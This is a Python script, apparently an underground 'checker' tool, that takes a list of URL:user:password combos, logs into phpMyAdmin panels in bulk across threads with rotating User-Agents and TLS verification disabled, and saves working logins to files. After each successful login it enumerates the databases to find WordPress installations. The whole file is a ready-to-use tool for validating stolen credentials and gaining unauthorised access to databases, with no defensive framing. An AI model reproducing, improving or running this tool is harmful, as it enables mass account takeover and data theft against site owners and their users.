#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
phpMyAdmin & WP DB Checker Pro+ - FULL VERSION
Author: YamiFool - RoyalFool
"""

import requests
import os
import re
import sys
import random
import argparse
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from datetime import datetime
import socket
import time

init(autoreset=True)
socket.setdefaulttimeout(15)
requests.packages.urllib3.disable_warnings()

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
]

# Tabel WordPress
WP_TABLES = [
    'wp_users', 'wp_options', 'wp_posts', 'wp_comments', 
    'wp_terms', 'wp_postmeta', 'wp_usermeta'
]

def print_banner():
    banner = f"""
{Fore.RED}╭╮╱╱╭╮╱╱╱╱╱╭━━━╮╱╱╱╱╱╭╮
{Fore.RED}┃╰╮╭╯┃╱╱╱╱╱┃╭━━╯╱╱╱╱╱┃┃
{Fore.RED}╰╮╰╯╭┻━┳╮╭┳┫╰━━┳━━┳━━┫┃
{Fore.RED}╱╰╮╭┫╭╮┃╰╯┣┫╭━━┫╭╮┃╭╮┃┃
{Fore.RED}╱╱┃┃┃╭╮┃┃┃┃┃┃╱╱┃╰╯┃╰╯┃╰╮
{Fore.RED}╱╱╰╯╰╯╰┻┻┻┻┻╯╱╱╰━━┻━━┻━╯{Fore.RESET}phpMyAdmin & WP DB Checker Pro+ By YamiFool

{Fore.CYAN}▪ FULL VERSION - With WP Detection
{Fore.CYAN}▪ Support Format URL:USER:PASS
{Fore.YELLOW}▪ Author: YamiFool - RoyalFool
{Style.RESET_ALL}
    """
    print(banner)

def parse_line_fixed(line):
    """Parse line dengan format URL:USER:PASS"""
    line = line.strip()
    if not line:
        return None, None, None
    
    # Format: http://domain.com/path/:user:pass
    parts = line.split(':')
    
    if len(parts) < 3:
        return None, None, None
    
    # Cari bagian URL (sampai sebelum user:pass)
    # Cari pola http:// atau https://
    url_parts = []
    user_pass_start = 0
    
    for i in range(len(parts)):
        if i > 0 and (parts[i-1].startswith('http') or parts[i-1].startswith('https')):
            # Ini adalah bagian setelah protokol
            continue
    
    # Gabungkan URL (semua kecuali 2 bagian terakhir)
    url = ':'.join(parts[:-2])
    username = parts[-2]
    password = parts[-1]
    
    # Bersihkan
    url = url.strip()
    username = username.strip()
    password = password.strip()
    
    # Pastikan URL punya protokol
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    return url, username, password

def check_wp_database(session, base_url):
    """Cek database WordPress"""
    try:
        # Coba akses server_databases.php
        db_url = urljoin(base_url, 'server_databases.php')
        resp = session.get(db_url, timeout=8)
        
        if resp.status_code == 200:
            # Cari database
            databases = re.findall(r'db=([^"&\'<>\s]+)', resp.text)
            databases = list(set(databases))[:5]  # Max 5 database
            
            wp_dbs = []
            for db in databases:
                # Cek struktur database
                struct_url = urljoin(base_url, f'db_structure.php?db={db}')
                struct_resp = session.get(struct_url, timeout=8)
                
                if struct_resp.status_code == 200:
                    for table in WP_TABLES:
                        if table in struct_resp.text:
                            wp_dbs.append(db)
                            break
            
            if wp_dbs:
                return True, f"WP DB: {', '.join(wp_dbs)}"
        
        return False, "No WP DB"
    except:
        return False, "Gagal cek DB"

def check_phpmyadmin(target_url, username, password):
    """Check phpMyAdmin credentials + WP Database"""
    try:
        # Bersihkan URL
        target_url = target_url.strip()
        
        # Tentukan login URL
        if target_url.endswith('/'):
            login_url = target_url + 'index.php'
        elif 'index.php' in target_url:
            login_url = target_url
        else:
            login_url = target_url.rstrip('/') + '/index.php'
        
        base_url = login_url.replace('index.php', '').rstrip('/')
        
        # Setup session
        session = requests.Session()
        session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        session.verify = False
        session.timeout = 15
        
        # Ambil halaman login
        resp1 = session.get(login_url, timeout=10)
        if resp1.status_code != 200:
            return False, f"HTTP {resp1.status_code}", None
        
        # Extract token
        token = ''
        token_match = re.search(r'name="token" value="([a-f0-9]+)"', resp1.text)
        if token_match:
            token = token_match.group(1)
        
        # Data login
        post_data = {
            'pma_username': username,
            'pma_password': password,
            'server': '1',
            'token': token
        }
        
        # Kirim login
        resp2 = session.post(login_url, data=post_data, allow_redirects=False, timeout=10)
        
        # Cek sukses
        login_success = False
        
        if resp2.status_code in [302, 301]:
            login_success = True
            # Follow redirect
            redirect_url = resp2.headers.get('Location', '')
            if redirect_url:
                if redirect_url.startswith('http'):
                    session.get(redirect_url, timeout=5)
                else:
                    session.get(urljoin(base_url, redirect_url), timeout=5)
        
        elif resp2.status_code == 200:
            if 'database' in resp2.text.lower() and 'phpmyadmin' in resp2.text.lower():
                login_success = True
        
        if login_success:
            # Cek database WordPress
            wp_status, wp_message = check_wp_database(session, base_url)
            if wp_status:
                return True, "SUKSES", wp_message
            else:
                return True, "SUKSES", None
        
        return False, "Login gagal", None
        
    except requests.exceptions.ConnectionError:
        return False, "Koneksi gagal", None
    except requests.exceptions.Timeout:
        return False, "Timeout", None
    except Exception as e:
        return False, f"Error", None

def worker(line):
    """Worker function"""
    try:
        url, username, password = parse_line_fixed(line)
        if not url:
            return line, False, "Format salah", None
        
        status, message, wp_info = check_phpmyadmin(url, username, password)
        return line, status, message, wp_info
    except Exception as e:
        return line, False, "Error", None

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", required=True, help="File input")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Threads")
    parser.add_argument("-o", "--output", default="valid.txt", help="Output file")
    args = parser.parse_args()
    
    # Baca file
    try:
        with open(args.file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip()]
    except Exception as e:
        print(f"{Fore.RED}[!] Gagal baca file: {e}{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"\n{Fore.YELLOW}[*] Total target: {len(lines)}")
    print(f"{Fore.YELLOW}[*] Threads: {args.threads}")
    print(f"{Fore.YELLOW}[*] Mulai scanning...\n")
    
    # Hapus file output lama
    for f in [args.output, 'wp_database_found.txt']:
        if os.path.exists(f):
            os.remove(f)
    
    valid = 0
    wp_found = 0
    processed = 0
    start = time.time()
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(worker, line): line for line in lines}
        
        for future in as_completed(futures):
            original, status, message, wp_info = future.result()
            processed += 1
            
            # Ambil domain untuk display (lebih informatif)
            try:
                url_part = original.split(':')[1:3]  # Ambil bagian domain
                if '//' in original:
                    domain = original.split('//')[1].split('/')[0].split(':')[0]
                else:
                    domain = original.split('/')[2].split(':')[0] if '//' in original else original[:30]
            except:
                domain = original[:30]
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            if status:
                valid += 1
                
                if wp_info:
                    wp_found += 1
                    # HIJAU + WP DB
                    print(f"{Fore.MAGENTA}[{timestamp}] [WP-DB] {domain} | {wp_info}")
                    # Simpan ke file WP database
                    with open('wp_database_found.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{original}\n")
                else:
                    # HIJAU biasa
                    print(f"{Fore.GREEN}[{timestamp}] [VALID] {domain} | {message}")
                
                # Simpan semua yang valid
                with open(args.output, 'a', encoding='utf-8') as f:
                    f.write(f"{original}\n")
            else:
                # MERAH
                print(f"{Fore.RED}[{timestamp}] [GAGAL] {domain} | {message}")
            
            # Progress setiap 10 target
            if processed % 10 == 0 or processed == len(lines):
                elapsed = time.time() - start
                speed = processed / elapsed if elapsed > 0 else 0
                print(f"{Fore.CYAN}[*] Progress: {processed}/{len(lines)} | Valid: {valid} | WP: {wp_found} | Speed: {speed:.1f}/s")
    
    elapsed = time.time() - start
    print(f"\n{Fore.GREEN}{'='*50}")
    print(f"{Fore.GREEN}[✓] SCAN SELESAI!")
    print(f"{Fore.GREEN}[✓] Total target: {len(lines)}")
    print(f"{Fore.GREEN}[✓] Valid login: {valid}")
    print(f"{Fore.GREEN}[✓] WordPress DB: {wp_found}")
    print(f"{Fore.GREEN}[✓] Waktu: {elapsed:.2f} detik")
    print(f"{Fore.GREEN}[✓] Hasil valid: {args.output}")
    print(f"{Fore.GREEN}[✓] WP Database: wp_database_found.txt")
    print(f"{Fore.GREEN}{'='*50}")
    print(f"{Fore.YELLOW}[*] Author: YamiFool - RoyalFool{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
